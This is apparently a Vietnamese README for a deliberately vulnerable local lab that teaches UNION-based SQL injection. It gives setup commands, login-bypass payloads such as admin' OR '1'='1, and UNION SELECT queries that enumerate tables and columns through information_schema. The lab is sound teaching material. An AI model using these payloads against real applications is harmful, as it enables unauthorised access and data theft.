# SQLi Lab (UNION BASED)

Lab này giúp bạn nắm vững kỹ thuật SQL Injection dạng UNION trên ứng dụng demo. Bạn sẽ thực hành: (1) bypass đăng nhập bằng payload ghép chuỗi; (2) xác định số cột/kiểu dữ liệu hiển thị; (3) dùng UNION SELECT để trích xuất dữ liệu từ information_schema (liệt kê database → bảng → cột) và cuối cùng đọc dữ liệu nhạy cảm (ví dụ users/flags). Qua đó, bạn hiểu quy trình khai thác thực tế và các biện pháp phòng tránh cơ bản.

## Chạy bằng Python thuần
```bash
python -m venv venv
source venv/bin/activate        # Windows: venv\Scripts\activate
pip install -r requirements.txt
python app.py
```
Mở: `http://localhost:5000`

## Chạy bằng Docker
```bash
docker compose up --build -d
```
Mở: `http://localhost:5000`

---

## 1) SQLi ở trang Login (bypass xác thực)
Form `/login` ghép chuỗi trực tiếp vào câu lệnh SQL.

**Payload mẫu (điền vào form):**
- Username: `admin' OR '1'='1`  
  Password: `anything`
- (Tối thiểu) Username: `' OR '1'='1`  • Password: `x`
- Biến thể có comment MySQL:  
  Username: `admin' OR '1'='1' -- +`

Đăng nhập xong bạn sẽ thấy đã vào được phiên người dùng (hoặc “Xin chào, …”).

---

## 2) SQLi ở trang Product (UNION)
Endpoint: `/product?product_id=...`

**Kiểm tra lỗi cú pháp:**
```
http://localhost:5000/product?product_id=1'
```

**Một số payload:**

Liệt kê các bảng: 
```sql
/product?product_id = 0 UNION SELECT 1,2,3,table_name FROM information_schema.tables WHERE table_schema = database()
```

Liệt kê các cột:
```sql
/product?product_id = 0 UNION SELECT 1,2,3,column_name FROM information_schema.columns WHERE table_name = '...'
```


